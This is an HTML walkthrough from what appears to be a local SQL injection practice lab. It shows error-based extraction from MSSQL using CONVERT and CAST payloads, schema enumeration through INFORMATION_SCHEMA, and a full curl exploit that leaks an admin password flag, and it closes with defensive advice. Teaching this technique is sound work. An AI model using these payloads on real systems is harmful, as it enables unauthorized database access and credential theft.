<h4>Step 1: Test Normal Login</h4>
<p>Try a valid login to understand the application behavior.</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 1. Normal Login</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>alice<br>
        <span class="prompt">Password: </span>alice_sunny_42<br>
        <span class="prompt">Response: </span><strong>Login successful -- Welcome back!</strong>
    </div>
</div>

<p>Invalid credentials show: <strong>"Invalid credentials. No matching user found."</strong>: no data is displayed, only success/fail.</p>

<h4>Step 2: Confirm Injection</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 2. Error Confirmation</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>'<br>
        <span class="prompt">Password: </span>anything<br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[42000]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Incorrect syntax near 'anything'.</strong><br><br>
        <span class="prompt">// Error messages are displayed -- this is our extraction channel!</span>
    </div>
</div>

<h4>Step 3: Error-Based Extraction with CONVERT</h4>
<p>
    <code>CONVERT(INT, string_value)</code> fails when converting a string to integer,
    and MSSQL includes the full string value in the error message.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 3. CONVERT with @@version</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND 1=CONVERT(INT, @@version) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Conversion failed when converting the nvarchar value 'Microsoft SQL Server 2022 (RTM-CU24) (KB5080999) - 16.0.4245.2 (X64)...' to data type int.</strong><br><br>
        <span class="prompt">// The full SQL Server version string leaks through the error!</span>
    </div>
</div>

<h4>Step 4: Extract the Admin Password</h4>
<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 4. CONVERT Password Extraction</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'FLAG{ms_c0nv3rt_c4st_3rr0r}' to data type int.</strong>
    </div>
</div>

<p>The admin password is leaked directly in the error message!</p>

<h4>Step 5: Alternative. CAST Syntax</h4>
<p>CAST works identically but uses different syntax:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 5. CAST Version</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">Username: </span>' AND 1=CAST((SELECT TOP 1 password FROM users WHERE username='admin') AS INT) -- -<br>
        <span class="prompt">Password: </span>anything<br><br>
        <span class="prompt">Error: </span><strong>MSSQL Error: SQLSTATE[22018]: [Microsoft][ODBC Driver 18 for SQL Server][SQL Server]Conversion failed when converting the varchar value 'FLAG{ms_c0nv3rt_c4st_3rr0r}' to data type int.</strong>
    </div>
</div>

<h4>Step 6: Enumerate Tables and Columns</h4>
<p>If you didn't know the table structure, extract it via errors:</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">Step 6. Schema Enumeration</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">// Get first table name:</span><br>
        <span class="prompt">Username: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 TABLE_NAME FROM INFORMATION_SCHEMA.TABLES)) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>users</strong>' to data type int.<br><br>
        <span class="prompt">// Get first column name:</span><br>
        <span class="prompt">Username: </span>' AND 1=CONVERT(INT, (SELECT TOP 1 COLUMN_NAME FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users')) -- -<br>
        <span class="prompt">Error: </span>SQLSTATE[22018]: Conversion failed when converting the nvarchar value '<strong>id</strong>' to data type int.
    </div>
</div>

<h4>Step 7: Submit the Password</h4>
<p>
    Copy the flag from the error message and paste it into the verification form:
    <code>FLAG{ms_c0nv3rt_c4st_3rr0r}</code>.
</p>

<div class="terminal">
    <div class="terminal-header">
        <span class="terminal-dot red"></span>
        <span class="terminal-dot yellow"></span>
        <span class="terminal-dot green"></span>
        <span class="terminal-title">curl. Full Exploit</span>
    </div>
    <div class="terminal-body">
        <span class="prompt">$ </span>curl -s "http://localhost/SQLi-Arena/mssql/lab2" \<br> --data-urlencode "username=' AND 1=CONVERT(INT, (SELECT TOP 1 password FROM users WHERE username='admin')) -- -" \<br>
        &nbsp;&nbsp;--data-urlencode "password=x"<br><br>
        <span class="prompt"># Verified output:</span><br>
        MSSQL Error: SQLSTATE[22018]: Conversion failed when converting the varchar value 'FLAG{ms_c0nv3rt_c4st_3rr0r}' to data type int.
    </div>
</div>

<div class="result-success result-box">
    <strong>Key Takeaway:</strong> MSSQL's <code>CONVERT(INT, value)</code> and <code>CAST(value AS INT)</code>
    are the primary error-based extraction vectors. When a string cannot be converted to an integer,
    MSSQL includes the full string in the error message. Use <code>SELECT TOP 1</code> to extract
    one row at a time. Combine with <code>INFORMATION_SCHEMA</code> for full schema enumeration.
    Always suppress raw error messages in production and use parameterized queries.
</div>
